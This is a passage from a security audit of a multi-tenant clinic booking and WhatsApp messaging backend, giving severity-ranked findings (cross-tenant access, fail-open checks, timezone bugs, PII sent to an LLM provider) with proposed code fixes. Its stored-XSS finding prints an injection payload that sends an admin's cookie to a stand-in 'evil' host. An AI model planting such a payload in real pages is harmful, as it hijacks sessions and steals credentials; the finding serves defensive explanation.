**[DATABASE / SECURITY IMPACT]**
Full read + write BOLA across tenants on clinical scheduling data. Competitive-intelligence leak (fee schedules are commercially sensitive), denial of service against a competitor's patient bookings, and — because slot generation reads these rows — indirect patient harm when appointments cannot be booked for a doctor who is in fact available. `log_admin_action` records the change under the attacker's clinic, so the victim's audit trail shows an unattributable mutation.

**[PRODUCTION-READY FIX]**
Add a single ownership resolver and route all four endpoints through it. One guard in the shared helper is smaller and safer than four independent patches.

```python
# app/services/permissions.py — add
async def resolve_owned_branch(user, branch_id: str) -> dict:
    """Return the branch ONLY if it belongs to the caller's clinic.

    enforce_branch_scope() answers "is this staff pinned elsewhere?" — it is NOT
    an ownership check and passes unconditionally for clinic_admin. Every
    endpoint that accepts a client-supplied branch_id must call this instead.
    """
    from app.database import supabase
    from fastapi import HTTPException

    res = supabase.table("branches").select("*").eq("id", branch_id).execute()
    if not res.data:
        raise HTTPException(status_code=404, detail="Branch not found")
    branch = res.data[0]

    if user.role != "super_admin":
        if not user.clinic_id or str(branch.get("clinic_id")) != str(user.clinic_id):
            # 404, not 403 — do not confirm the existence of another tenant's branch.
            raise HTTPException(status_code=404, detail="Branch not found")

    enforce_branch_scope(user, branch_id)   # keep the staff-pinning check
    return branch
```

```python
# app/routers/admin.py — apply at the top of all four handlers.
# Example for update_doctor_branch_session (L3949); the other three are identical.
@router.put("/branches/{branch_id}/doctors/{doctor_id}")
async def update_doctor_branch_session(
    branch_id: str,
    doctor_id: str,
    payload: dict,
    user: AdminUser = Depends(verify_credentials),
):
    from app.services.permissions import resolve_owned_branch

    branch = await resolve_owned_branch(user, branch_id)     # ← ownership gate
    clinic_id = branch["clinic_id"]

    # Scope the doctor to the same clinic so a foreign doctor_id cannot be
    # attached to an owned branch.
    doc = (
        supabase.table("doctors").select("id")
        .eq("id", doctor_id).eq("clinic_id", clinic_id).execute()
    )
    if not doc.data:
        raise HTTPException(status_code=404, detail="Doctor not found")

    result = (
        supabase.table("branch_doctors")
        .update(payload)
        .eq("branch_id", branch_id)
        .eq("doctor_id", doctor_id)
        .execute()
    )
    ...
```

Then run the same scan that found these — every `supabase.table(...)` in `app/routers/` whose enclosing function has no `.eq("clinic_id", ...)` — as a CI check, so new endpoints cannot regress.

---

# HIGH

## H1 — `_can_send_freeform` returns `True` in its exception handler

**[LOCATION]** `app/services/whatsapp.py:552-574`

**[ROOT CAUSE]** The function is careful — `return False` when there is no conversation, `return False` when `session_expires_at` is missing — and then throws all of it away:

```python
        except Exception as e:
            logger.error(f"Error checking session expiry: {e}")
            return True          # ← fails open into a Meta policy violation
```

**[REAL-WORLD FAILURE SCENARIO]** Supabase blips during a lab-report batch. `get_conversation` raises. `_can_send_freeform` returns `True`, so `lab_reports.py:118` takes the freeform branch instead of the utility-template branch. Meta rejects with 131047 (or accepts and counts it as an unapproved message to a user outside the window). `send_text` returns falsy → `raise ValueError` → the report is recorded `failed`. Under a sustained blip this is the entire batch.

**[DATABASE / SECURITY IMPACT]** Batch-wide lab report delivery failure — patients do not receive clinical results. Repeated out-of-window sends degrade the WhatsApp Business phone-number quality rating; sustained violations get the number restricted or banned, which takes the whole tenant offline.

**[PRODUCTION-READY FIX]**

```python
# app/services/whatsapp.py:571-574
        except Exception as e:
            # Fail CLOSED: assume we are OUTSIDE the 24h window. Guessing "inside"
            # produces a Meta policy violation and tanks the number's quality
            # rating; guessing "outside" merely routes through the approved
            # utility template, which is always allowed.
            logger.error(f"Error checking session expiry (assuming outside 24h): {e}")
            return False
```

Guard the caller so this does not convert a blip into a hard failure — `lab_reports.py:118-124` already raises when the template is unset; that is correct, but make the message actionable by naming the fallback reason.

---

## H2 — Delivery receipts applied with no ordering guard and no clinic scope

**[LOCATION]** `app/routers/webhook.py:101-122`

**[ROOT CAUSE]** `record_delivery_status` blind-writes whatever state arrives:

```python
supabase.table("lab_reports").update({
    "delivery_status": state, ...
}).eq("whatsapp_message_id", wamid).execute()
```

Meta delivers `sent`/`delivered`/`read` as separate webhooks with no ordering guarantee, and each is dispatched through `BackgroundTasks` (`L75`) with no serialisation. There is also no `clinic_id` filter, so the update matches on `wamid` across every tenant.

**[REAL-WORLD FAILURE SCENARIO]**
1. Patient opens the PDF within a second of delivery. Meta emits `sent`, `delivered`, `read` in rapid succession, batched into one webhook POST.
2. Three background tasks are created. Under load the event loop runs them out of order, or the `read` task's Supabase call completes before the `sent` task's.
3. Final stored `delivery_status` is `sent` — a regression from `read`.
4. The `/admin/lab-reports/deliveries` view and the "Delivered Today" stat card disagree, which is precisely the class of desync the recent commits (`da505f9`, `dd3b5cd`) have been chasing at the *rendering* layer. The defect is at the write layer.
5. Failure variant: a `failed` receipt arriving after `delivered` marks a successfully-read report as failed, prompting staff to re-send PHI unnecessarily.

**[DATABASE / SECURITY IMPACT]** Delivery-state corruption in a table used as the clinical delivery record. NABH audits ask "prove the patient received the report" — a status that can regress is not evidence. Operationally it drives unnecessary re-sends of PHI.

**[PRODUCTION-READY FIX]** Rank the states and only ever move forward.

```python
# app/routers/webhook.py — replace record_delivery_status (L101-122)

# Meta delivers sent/delivered/read out of order and BackgroundTasks does not
# serialise them. Rank the states so a late 'sent' can never overwrite a 'read'.
_DELIVERY_RANK = {"failed": 0, "sent": 1, "delivered": 2, "read": 3}


async def record_delivery_status(status: dict) -> None:
    """Persist a Meta delivery receipt, monotonically."""
    wamid = status.get("id")
    state = status.get("status")
    if not wamid or not state:
        return
    err = (status.get("errors") or [{}])[0]

    try:
        from app.database import supabase

        current = (
            supabase.table("lab_reports")
            .select("id, delivery_status")
            .eq("whatsapp_message_id", wamid)
            .limit(1)
            .execute()
        )
        if not current.data:
            return
        row = current.data[0]

        new_rank = _DELIVERY_RANK.get(state, -1)
        old_rank = _DELIVERY_RANK.get(row.get("delivery_status") or "", -1)

        # 'failed' is terminal and always wins; otherwise only advance.
        if state != "failed" and new_rank <= old_rank:
            logger.debug(
                f"Ignoring out-of-order receipt {state} for {wamid} "
                f"(current: {row.get('delivery_status')})"
            )
            return

        supabase.table("lab_reports").update({
            "delivery_status": state,
            "delivery_error": (err.get("title") or err.get("message")) if err else None,
            "delivery_updated_at": datetime.now(timezone.utc).isoformat(),
        }).eq("id", row["id"]).execute()      # scope by PK, not by wamid

        if state == "failed":
            logger.error(f"Meta delivery FAILED for wamid {wamid}: {err}")
    except Exception as e:
        logger.warning(f"Could not record delivery status for {wamid}: {e}")
```

Belt and braces at the schema level:

```sql
-- migrations/0XX_wamid_unique.sql
CREATE UNIQUE INDEX IF NOT EXISTS idx_lab_reports_wamid
    ON lab_reports (whatsapp_message_id)
    WHERE whatsapp_message_id IS NOT NULL;
```

This makes the `wamid` → row mapping provably 1:1, which is the invariant the stat-card reconciliation depends on.

---

## H3 — Slot availability ignores `pending_payment` holds

**[LOCATION]** `app/database.py:406-416` (`_fetch_booked`)

**[ROOT CAUSE]** The booked-slot query filters `status == "confirmed"`, but `idx_unique_active_slot` (migration 008) reserves on `status IN ('pending_payment','confirmed')`. The display layer and the constraint layer disagree about what "taken" means.

**[REAL-WORLD FAILURE SCENARIO]** P1 confirms Dr Rao 10:00 → `pending_payment`, slot reserved at the DB. Within the 10-minute hold, P2 asks for slots: 10:00 is offered because it is not `confirmed`. P2 selects it, confirms, and `create_booking_with_payment` hits `23505` → "slot_taken" → `_show_slot_list` re-renders the same stale list, which still contains 10:00. P2 can loop. Every patient browsing during any active hold sees phantom availability; at morning rush with 10-minute holds this is most of the inventory.

**[DATABASE / SECURITY IMPACT]** No data corruption — the index holds — but a large volume of failed bookings, abandoned funnels, and patients told a slot is free seconds before being told it is not.

**[PRODUCTION-READY FIX]** Make the read agree with the constraint, and exclude expired holds so a crashed sweeper cannot freeze inventory.

```python
# app/database.py — replace _fetch_booked (L406-416)
    def _fetch_booked():
        # MUST mirror idx_unique_active_slot (migration 008), which reserves on
        # status IN ('pending_payment','confirmed'). Filtering on 'confirmed'
        # alone advertises slots the database will refuse to book.
        now_iso = datetime.now(timezone.utc).isoformat()
        return (
            supabase.table("appointments")
            .select("appointment_time, status, hold_expires_at")
            .eq("clinic_id", clinic_id)
            .eq("doctor_name", doctor_name)
            .eq("appointment_date", check_date_str)
            .in_("status", ["confirmed", "pending_payment"])
            .or_(f"status.eq.confirmed,hold_expires_at.gt.{now_iso}")
            .execute()
        )
```

Keep the `slot_taken` recovery path, but re-fetch fresh slots rather than reusing the stale list — `conversation.py:2633-2641` already re-calls `get_available_slots`, so that path is correct once this query is.

---

## H4 — Same-day slot cutoff uses naive server-local time against IST slot strings

**[LOCATION]** `app/database.py:486-488`

**[ROOT CAUSE]**
```python
if check_date == dt_date.today():
    cutoff = (datetime.now() + timedelta(minutes=30)).strftime("%H:%M")
    available = [s for s in available if s > cutoff]
```
`datetime.now()` and `dt_date.today()` are naive and follow the container's `TZ`. Render containers run UTC. Slot strings are IST wall-clock. The scheduler (`AsyncIOScheduler(timezone=ZoneInfo("Asia/Kolkata"))`) and `payment._parse_slot_datetime` both handle IST correctly, so this file is the sole inconsistency — which is why it survives local testing on an IST developer machine.

**[REAL-WORLD FAILURE SCENARIO]** At 09:00 IST the container reads 03:30 UTC; cutoff becomes `04:00`, so every slot from 04:00 onward is offered — including 08:00, already in the past. A patient books a slot that has elapsed; they arrive to find the doctor's session over. Symmetrically, `dt_date.today()` in UTC rolls over 5h30m late, so between 00:00 and 05:30 IST the "today" branch never fires and *all* of today's past slots are offered.

**[DATABASE / SECURITY IMPACT]** Appointments recorded for times already gone. Patients travel to a clinic for a slot that cannot be honoured; for a diagnostic centre with fasting-dependent tests this wastes the patient's fast. Reminder jobs fire for past appointments.

**[PRODUCTION-READY FIX]**

```python
# app/database.py — near the imports
from zoneinfo import ZoneInfo

IST = ZoneInfo("Asia/Kolkata")
```

```python
# app/database.py — replace L486-488
    # Slot strings are IST wall-clock. datetime.now()/date.today() are naive and
    # follow the container TZ (UTC on Render), so comparing them shifts the
    # cutoff by 5h30m and offers slots that have already passed.
    now_ist = datetime.now(IST)
    if check_date == now_ist.date():
        cutoff = (now_ist + timedelta(minutes=30)).strftime("%H:%M")
        available = [s for s in available if s > cutoff]
```

Grep for the rest of the class before shipping: `grep -n "datetime.now()\|date.today()" app/ connectors/` — every naive call compared against a wall-clock string needs the same treatment.

---

## H5 — PII sanitizer defeated: patient name sent to OpenRouter in plaintext

**[LOCATION]** `app/services/report_summarizer.py:60-64`

**[ROOT CAUSE]** The sanitizer redacts the patient's name out of the report body — and then the prompt puts it back, in the clear, two lines above:

```python
"content": (
    # Use patient_name directly for context (sanitized_text has it redacted)
    f"Patient name: {patient_name}\n"          # ← raw PII to a third party
    f"Report type: {report_type}\n"
    # Send sanitized text — no raw PII reaches OpenRouter
    f"Report text:\n{sanitized_text[:3000]}\n\n"
```

The comment on L65 asserts the exact property the line on L63 violates. Combined with the clinical values in `sanitized_text`, OpenRouter/DeepSeek receives an identified health record, not a de-identified one.

**[DATABASE / SECURITY IMPACT]** Name + diagnosis + test values transferred to a third-party processor outside India. Under DPDP 2023 this is processing of sensitive personal data without a valid processor agreement or consent basis; the whole point of the sanitizer module is to establish that basis, and this line removes it. The name is not needed for summarisation quality — `restore_pii` already re-inserts it locally at L115.

**[PRODUCTION-READY FIX]**

```python
# app/services/report_summarizer.py — replace the user message (L58-77)
                {
                    "role": "user",
                    "content": (
                        # NEVER send the real name. sanitize_report_text() redacted
                        # it from the body; naming it here would re-identify the
                        # record for the third-party processor. The placeholder
                        # keeps the LLM's addressing natural and restore_pii()
                        # swaps the real name back in locally (L115).
                        f"Patient name: [PATIENT]\n"
                        f"Report type: {report_type}\n"
                        f"Report text:\n{sanitized_text[:3000]}\n\n"
                        "Respond with JSON in exactly this format:\n"
                        "{\n"
                        '  "summary_lines": ["line1", "line2", "line3"],\n'
                        '  "has_abnormal_values": true or false,\n'
                        '  "patient_message": "A 2-3 sentence plain English message to send to the patient '
                        "explaining the key findings. Begin it with the literal token [PATIENT] where the "
                        "patient's name belongs. End by advising them to consult their doctor if anything "
                        'is marked abnormal.",\n'
                        '  "doctor_flag_reason": "One sentence reason to flag for doctor review, or null if '
                        'everything is normal"\n'
                        "}"
                    ),
                },
```

`restore_pii` maps `[PATIENT_n]` keys, so add the bare-token case:

```python
# app/utils/pii_sanitizer.py — in restore_pii, after the existing loop
    # The prompt instructs the model to emit a bare [PATIENT] token. Map it to
    # the first PATIENT_n capture so the outbound message reads naturally.
    if "[PATIENT]" in result:
        first = next(
            (v for k, v in redaction_map.items() if k.startswith("[PATIENT_")), ""
        )
        result = result.replace("[PATIENT]", first)
```

Add a test asserting the outbound OpenRouter payload never contains the literal patient name — this is the compliance control, so it deserves an explicit regression guard.

---

## H6 — Stored XSS via unescaped values in inline-JS string context

**[LOCATION]** `admin/index.html:2978`, `3711` (also verify `4610`, `4789`, `4846`)

**[ROOT CAUSE]** `esc()` (L2322-2324) escapes `& < > " '` for **HTML text** context. Two sinks interpolate untrusted values into a **JavaScript string literal inside an HTML attribute**, where the browser HTML-decodes the attribute *before* the JS parser sees it — so `&#39;` becomes `'` and closes the string:

```js
// L2978
onclick="openLabReportModalFor('${p.phone}','${(p.name||'').replace(/'/g,"\\'")}')"
```
`p.phone` has no escaping at all; the name uses a backslash-escape that HTML-decoding defeats.

**[REAL-WORLD FAILURE SCENARIO]** A patient sets their WhatsApp profile name — or a MocDoc record carries a name field — containing `');fetch('//evil/'+document.cookie);//`. The value flows through the connector into `lab_reports.patient_name` and is rendered into the admin panel. When a clinic admin opens the patients list, the payload runs with the admin's session. CSP does not stop it: `script-src` includes `'unsafe-inline'` (L1). The attacker can then drive every authenticated admin endpoint — including the cross-tenant ones in C7 and H9.

**[DATABASE / SECURITY IMPACT]** Full admin-session compromise from an unauthenticated input channel (a WhatsApp profile name). Combined with C7, one patient-controlled string yields cross-tenant read/write across the platform.

**[PRODUCTION-READY FIX]** Stop building JS out of strings. Bind the data as attributes and read it back in the handler.

```js
// admin/index.html — add next to esc() (~L2324)
// esc() is for HTML *text*. Values that land inside a JS string literal in an
// attribute need the attribute HTML-decoded first, so backslash-escaping is
// defeated. Bind data-* attributes and read them in the handler instead.
function attr(v) { return esc(String(v == null ? '' : v)); }
```

```js
// L2978 — replace the onclick with data binding
`<button class="btn-report"
         data-phone="${attr(p.phone)}"
         data-name="${attr(p.name || '')}">Send report</button>`
```

```js
// one delegated listener, registered once at init
document.addEventListener('click', (e) => {
  const b = e.target.closest('.btn-report');
  if (!b) return;
  openLabReportModalFor(b.dataset.phone, b.dataset.name);
});
```

Apply the identical pattern to `manageBranchDoctors(...)` at L3711 and to the `openResolveMatchModal('${r.id}', '${esc(name)}', ...)` sites around L4610/4789/4846. Then grep the panel for the whole class: `grep -n "onclick=\"[^\"]*\\${" admin/index.html admin/platform.html` — every hit is the same bug.

---

## H7 — Razorpay webhook router has no exception guard

**[LOCATION]** `app/routers/razorpay_webhook.py` (the `POST /webhooks/razorpay/{clinic_id}` handler)

**[ROOT CAUSE]** `process_payment_webhook` is awaited with no `try/except`. Any exception becomes an unhandled 500 with a FastAPI error body.

**[REAL-WORLD FAILURE SCENARIO]** The C3 unique-violation path raises. Razorpay sees 5xx, marks delivery failed, and retries on its backoff schedule (up to 24h). Each retry raises again. The clinic gets no alert; the patient's money stays captured; the log fills with identical tracebacks. Separately, CLAUDE.md mandates "never expose stack traces in webhook API responses" — the WhatsApp webhook honours it (`webhook.py:95-98`), this one does not.

**[DATABASE / SECURITY IMPACT]** Infinite retry storm consuming event-loop capacity (compounding H10); financial events lost with no ledger entry; internal path/stack disclosure to an external caller.

**[PRODUCTION-READY FIX]**

```python
# app/routers/razorpay_webhook.py
@router.post("/razorpay/{clinic_id}")
async def razorpay_webhook(clinic_id: str, request: Request):
    raw_body = await request.body()
    signature = request.headers.get("X-Razorpay-Signature", "")

    try:
        webhook_secret = await _resolve_webhook_secret(clinic_id)
    except Exception as e:
        logger.error(f"Razorpay webhook: cannot resolve secret for {clinic_id}: {e}")
        # 200 so Razorpay stops retrying a request we can never process; the
        # orphan ledger + alert is the recovery path, not the retry queue.
        return {"status": "ignored"}

    try:
        result = await payment_service.process_payment_webhook(
            raw_body=raw_body,
            signature=signature,
            secret=webhook_secret,
            clinic_id=clinic_id,
        )
        return {"status": "ok", "result": result}
    except Exception as e:
        # Never leak a stack trace to an external caller, and never 500 into a
        # Razorpay retry storm. Record it and let reconciliation pick it up.
        logger.exception(
            f"Razorpay webhook processing failed for clinic {clinic_id}: {e}"
        )
        try:
            payment_service._log_orphan_payment_event(
                None, "webhook_processing_error",
                {"clinic_id": clinic_id, "error": str(e)[:500]},
            )
        except Exception:
            pass
        return {"status": "error"}
```

Returning 200 is correct here **only** because the orphan ledger + daily reconciliation now guarantee the event is not lost. Ship C3's ledger changes together with this.

---

## H8 — Unguarded `clinic['name']` deref after an explicit `None` check

**[LOCATION]** `app/routers/webhook.py:161-205`

**[ROOT CAUSE]** L162 concedes the value can be `None` (`clinic.get("id") if clinic else None`), then L203-205 subscripts it unconditionally:

```python
clinic_id = clinic.get("id") if clinic else None      # L162
...
logger.info(f"[{clinic['name']}] Processing message from ...")   # L204
```

**[REAL-WORLD FAILURE SCENARIO]** Once C1 is fixed, `resolve_tenant` raises for unknown numbers and the DLQ path handles it correctly. But `asyncio.create_task(whatsapp_service.mark_as_read(clinic, message_id))` at L179 also passes a possibly-`None` clinic into a service that dereferences it, and the log line at L204 raises `TypeError` *after* `message_queue.acquire()` has already consumed the `wamid`. The message goes to the DLQ, and on replay `acquire()` returns `False` (already claimed) — so the message is **permanently dropped**.

**[DATABASE / SECURITY IMPACT]** Silent, unrecoverable loss of patient messages — including emergency escalations, which the clinical firewall is supposed to route. The idempotency claim outliving the failed processing attempt makes the DLQ retry a no-op, so the failure is invisible in retry metrics.

**[PRODUCTION-READY FIX]** Fail fast before the claim, and make the claim releasable.

```python
# app/routers/webhook.py — process_message, after resolve_tenant (L161-165)
        clinic = await resolve_tenant(display_phone)
        if not clinic or not clinic.get("id"):
            # Raise BEFORE claiming the wamid — a claim that outlives a failed
            # attempt makes the DLQ replay a silent no-op.
            raise TenantNotFound(f"No clinic resolved for {display_phone}")
        clinic_id = clinic["id"]
```

```python
# app/services/message_queue.py — add, and call it from process_message_safe's
# except branch so a failed attempt can be legitimately replayed.
    async def release(self, message_id: str) -> None:
        """Drop a claim so a dead-lettered message can be reprocessed."""
        try:
            supabase.table("processed_messages").delete().eq(
                "message_id", message_id
            ).execute()
        except Exception as e:
            logger.warning(f"Could not release claim for {message_id}: {e}")
```

```python
# app/routers/webhook.py — process_message_safe
    except Exception as e:
        logger.error(f"Message processing failed, dead-lettering: {e}")
        mid = getattr(message, "id", None)
        if mid:
            await message_queue.release(mid)     # make the replay meaningful
        ... existing DLQ insert ...
```

Also make the log line defensive: `clinic.get('name', 'unknown')`.

---

## H9 — Cross-tenant reads: payment events and daily reconciliation

**[LOCATION]** `app/routers/admin.py:2356-2373` (`GET /payment-events/{booking_id}`), `app/services/payment.py:958-997` (`get_daily_reconciliation`) surfaced at `admin.py:2375`

**[ROOT CAUSE]** Same class as C7, read-only side. `get_payment_events` selects `payment_events` by `booking_id` alone. `get_daily_reconciliation` aggregates `appointments` for a date with **no** `clinic_id` filter, so it returns platform-wide financials to any authenticated admin.

**[REAL-WORLD FAILURE SCENARIO]** Clinic A's admin opens the Payments tab. `GET /admin/payments/reconciliation?date=2026-08-22` returns totals spanning every clinic on the platform — collected amount, refunds, booking counts. Clinic A now knows its competitors' daily revenue. With a booking UUID (harvestable per C7), `GET /admin/payment-events/<uuid>` returns another tenant's full payment trail including `payment_id` and `raw_payload` — which contains the payer's name and contact from Razorpay's entity.

**[DATABASE / SECURITY IMPACT]** Cross-tenant disclosure of financial records and of payer PII embedded in `payment_events.raw_payload`. Commercially damaging and a DPDP disclosure event.

**[PRODUCTION-READY FIX]**

```python
# app/routers/admin.py — get_payment_events (L2356)
@router.get("/payment-events/{booking_id}")
async def get_payment_events(
    booking_id: str,
    user: AdminUser = Depends(verify_credentials),
):
    clinic_id = enforce_clinic_access(user, user.clinic_id or "default")

    # Prove the booking belongs to this tenant BEFORE reading its event trail;
    # payment_events.raw_payload contains payer PII from Razorpay.
    owns = (
        supabase.table("appointments").select("id")
        .eq("id", booking_id).eq("clinic_id", clinic_id).execute()
    )
    if not owns.data and user.role != "super_admin":
        raise HTTPException(status_code=404, detail="Booking not found")

    result = (
        supabase.table("payment_events").select("*")
        .eq("booking_id", booking_id)
        .order("created_at", desc=True)
        .execute()
    )
    return {"events": result.data or []}
```

```python
# app/services/payment.py — get_daily_reconciliation (L958+)
    async def get_daily_reconciliation(
        self, date: str, clinic_id: str
    ) -> dict:
        """Daily payment reconciliation for ONE clinic.

        clinic_id is required — an unscoped aggregate leaks every tenant's
        revenue to any authenticated admin.
        """
        if not clinic_id:
            raise ValueError("clinic_id is required for reconciliation")

        result = (
            supabase.table("appointments")
            .select("status, amount_paise, payment_id, refund_id, booking_ref")
            .eq("clinic_id", clinic_id)
            .eq("appointment_date", date)
            .execute()
        )
        ...
```

Update the `admin.py:2375` caller to pass `enforce_clinic_access(user, ...)`. `super_admin` needing platform totals should get an explicit, separately-authorised `/platform/reconciliation` endpoint rather than an implicit unscoped default.

---

## H10 — Synchronous Supabase client called from every `async def`

**[LOCATION]** `app/database.py:22` — `supabase: Client = create_client(_sb_url, _sb_key)`; consumed from `async def` throughout `app/services/` and `app/routers/`

**[ROOT CAUSE]** `supabase-py`'s `create_client` returns the **synchronous** client, built on blocking `httpx`. Every `supabase.table(...).execute()` inside an `async def` blocks the event loop for the full network round trip. `log_admin_action` in `app/routers/admin.py` correctly uses `asyncio.to_thread` — proof the pattern is known — but it is the exception.

**[REAL-WORLD FAILURE SCENARIO]** Morning rush, 40 concurrent patients. `_handle_message_locked` alone issues 6+ sequential blocking queries (`get_or_create_conversation`, `update_conversation` ×3, `get_patient_by_phone`, `detect_intent`). At 60 ms per round trip that is ~360 ms of **fully blocked** loop per message, single-file. Concurrent webhook POSTs queue behind it; Meta requires a 200 within 20 s and retries otherwise — driving duplicate deliveries straight into C5's fail-open guard. The per-phone lock's 15 s timeout then fires, dumping legitimate messages into the DLQ.

**[DATABASE / SECURITY IMPACT]** Throughput collapse under exactly the load the system is built for, with a feedback loop into duplicate processing. No data corruption on its own, but it is the amplifier that turns C5 from theoretical into routine.

**[PRODUCTION-READY FIX]** Full migration to `acreate_client` is a large change; the low-risk, zero-regression step is a thread-offload wrapper, adopted hot-path first.

```python
# app/database.py — after the client is created (L22)
import asyncio
from typing import Callable, TypeVar

T = TypeVar("T")


async def sb(fn: Callable[[], T]) -> T:
    """Run a blocking supabase-py call off the event loop.

    create_client() returns the SYNCHRONOUS client, so calling .execute()
    directly inside an `async def` blocks the loop for the whole round trip.
    Wrap every call site: `await sb(lambda: supabase.table(...).execute())`.

    ponytail: thread-offload rather than a full acreate_client migration —
    revisit if thread-pool saturation shows up in profiling.
    """
    return await asyncio.to_thread(fn)
```

```python
# Example adoption — app/database.py, _fetch_booked and friends
    booked = await sb(lambda: (
        supabase.table("appointments")
        .select("appointment_time, status, hold_expires_at")
        .eq("clinic_id", clinic_id)
        .eq("doctor_name", doctor_name)
        .eq("appointment_date", check_date_str)
        .in_("status", ["confirmed", "pending_payment"])
        .execute()
    ))
```

Adoption order by blast radius: `get_or_create_conversation` / `update_conversation` / `get_patient_by_phone` (every message) → `get_available_slots` internals → `payment.py` webhook path → admin routers. Raise the default thread-pool size at startup (`asyncio.get_running_loop().set_default_executor(ThreadPoolExecutor(max_workers=32))`) in `main.py`'s lifespan so the offload has room.

---

# MEDIUM

## M1 — `asyncio.gather` over blocking sync calls gives false parallelism

**[LOCATION]** `app/database.py:425-430`

**[ROOT CAUSE]** The four fetches are gathered as if concurrent, but each inner function makes a blocking sync Supabase call, so they execute strictly serially — while also blocking the loop (H10). The code reads as an optimisation that does not exist.

**[REAL-WORLD FAILURE SCENARIO]** `get_available_slots` appears to cost one round trip; it costs four, serially, ~240 ms of blocked loop per slot query. Every patient browsing slots pays it.

**[DATABASE / SECURITY IMPACT]** Latency only, but it sits on the hottest patient-facing path and compounds H10.

**[PRODUCTION-READY FIX]** Once `sb()` from H10 exists, the gather becomes real:

```python
# app/database.py:425-430
    holiday_data, leave_data, doc, booked_data = await asyncio.gather(
        sb(_fetch_holiday), sb(_fetch_leave), sb(_fetch_doc), sb(_fetch_booked)
    )
```

That is the whole fix — the `gather` was always right, the callables were not awaitable-friendly.

---

## M2 — `sanitize_report_text()` tuple misuse silently kills connector debug capture

**[LOCATION]** `connectors/mocdoc/worker.py:990`

**[ROOT CAUSE]** `sanitize_report_text()` returns `(redacted_text, redaction_map)`. The worker treats the tuple as a string:

```python
sanitized_html = sanitize_report_text(raw_html)     # tuple
...
f.encrypt(sanitized_html.encode())                  # AttributeError
html_path.write_text(sanitized_html, encoding="utf-8")   # TypeError
```

Both raise, and the enclosing `except Exception as e: logger.error("Could not save debug files")` swallows it.

**[REAL-WORLD FAILURE SCENARIO]** MocDoc changes a DOM selector and `DOWNLOAD_MODAL_MISSING` starts firing. The debug capture — the entire mechanism for diagnosing selector drift — never writes a single file. Engineers see only "DOWNLOAD_MODAL_MISSING" plus "Could not save debug files", and must reproduce against live MocDoc to learn anything. Reports silently stop flowing in the meantime.

**[DATABASE / SECURITY IMPACT]** No leak (it fails toward writing nothing). Operational: the connector's observability for its most likely failure mode is dead, extending outages of clinical report delivery.

**[PRODUCTION-READY FIX]**

```python
# connectors/mocdoc/worker.py:990
                raw_html = await self._page.content()
                # sanitize_report_text returns (text, redaction_map) — unpack it.
                # Assigning the tuple made every downstream .encode()/write_text()
                # raise into the outer except, so no debug file was ever written.
                sanitized_html, _redactions = sanitize_report_text(raw_html)
```

Then narrow the swallow so the next such bug is visible:

```python
            except Exception as e:
                logger.exception(f"Could not save debug files for {report_id}: {e}")
```

---

## M3 — `_alert_admin` always pages the platform phone, never the clinic

**[LOCATION]** `app/services/payment.py:1447-1459`

**[ROOT CAUSE]** The helper accepts a clinic but sends to `settings.hospital_phone` — the platform-wide env value — so every tenant's payment alert lands on the operator's number.

**[REAL-WORLD FAILURE SCENARIO]** Clinic B has a refund failure (C4's abort path, or C3's late-payment auto-refund). The alert goes to the platform operator, who has no context and no authority to act. Clinic B's staff never learn a patient is owed money. At 30 tenants the operator's WhatsApp is an undifferentiated alert firehose.

**[DATABASE / SECURITY IMPACT]** Financial exceptions go unactioned; the alert channel that the C3/C4 fixes depend on does not reach the party who can resolve them. Minor cross-tenant metadata disclosure to the operator (booking refs, amounts).

**[PRODUCTION-READY FIX]**

```python
# app/services/payment.py — replace _alert_admin (L1447-1459)
    async def _alert_admin(self, clinic: Optional[dict], message: str) -> None:
        """Alert the CLINIC's admin, falling back to the platform operator.

        Payment exceptions are actionable only by the clinic that holds the
        money — routing every tenant's alert to settings.hospital_phone means
        nobody who can act ever sees them.
        """
        from app.services.tenant import get_clinic_contact

        clinic = clinic or {}
        target = get_clinic_contact(clinic, "admin_phone", "") or get_clinic_contact(
            clinic, "phone", settings.hospital_phone
        )
        if not target:
            logger.error(f"ADMIN_ALERT (no recipient configured): {message}")
            return
        try:
            ok = await whatsapp_service.send_admin_alert(clinic, target, message)
            if not ok:
                logger.error(f"ADMIN_ALERT undelivered to {mask_phone(target)}: {message}")
        except Exception as e:
            logger.error(f"ADMIN_ALERT send failed: {e} | message={message}")
```

`send_admin_alert` already has the two-tier text→template fallback for the 24h window (added 2026-08-22), so this inherits that resilience.

---

## M4 — Bare `asyncio.create_task` — tasks can be garbage-collected mid-flight

**[LOCATION]** `app/routers/webhook.py:179`; same pattern in `app/services/whatsapp.py` `_log_to_ledger`

**[ROOT CAUSE]** `asyncio.create_task(...)` without retaining a reference. The loop holds only a weak reference, so a task that has not yet started can be collected and silently cancelled — documented CPython behaviour.

**[REAL-WORLD FAILURE SCENARIO]** Under GC pressure at high message volume, `mark_as_read` tasks vanish; patients see their messages stay unread (a trust signal for a hospital). More consequentially, dropped `_log_to_ledger` tasks mean outbound messages are sent but never recorded — the billing/audit ledger silently under-counts.

**[DATABASE / SECURITY IMPACT]** Gaps in the append-only outbound ledger used for billing reconciliation and NABH audit. Non-deterministic, so it will not reproduce in testing.

**[PRODUCTION-READY FIX]**

```python
# app/utils/helpers.py (or a small module-level set wherever it fits)
_BACKGROUND_TASKS: set = set()


def spawn(coro) -> None:
    """Fire-and-forget a coroutine while holding a strong reference.

    asyncio only keeps a weak reference to tasks, so a bare create_task() can be
    garbage-collected before it runs — silently dropping ledger writes.
    """
    task = asyncio.create_task(coro)
    _BACKGROUND_TASKS.add(task)
    task.add_done_callback(_BACKGROUND_TASKS.discard)
```

```python
# app/routers/webhook.py:177-179
        from app.utils.helpers import spawn
        spawn(whatsapp_service.mark_as_read(clinic, message_id))
```

Apply the same at every `asyncio.create_task` site: `grep -rn "asyncio.create_task" app/ connectors/`.

---

## M5 — Patient-side cancel/status queries not clinic-scoped

**[LOCATION]** `app/services/conversation.py:2842-2844` (cancel), `2862-2867` (status)

**[ROOT CAUSE]** Both operate on `booking_id` from the conversation context with no `clinic_id` filter:

```python
supabase.table("appointments").update({"status": "cancelled"}) \
    .eq("id", booking_id).eq("status", "pending_payment").execute()
```

The `booking_id` comes from the patient's own session so it is not directly attacker-supplied — but the conversation `context` is a JSONB blob that several code paths write, and any bug that lets a stale or foreign id land there becomes a cross-tenant write with no second gate.

**[DATABASE / SECURITY IMPACT]** Defence-in-depth gap on a patient-triggered write path. Low likelihood today, high impact if the context is ever poisoned. Cheap to close.

**[PRODUCTION-READY FIX]**

```python
# app/services/conversation.py:2840-2844
                supabase.table("appointments").update(
                    {"status": "cancelled"}
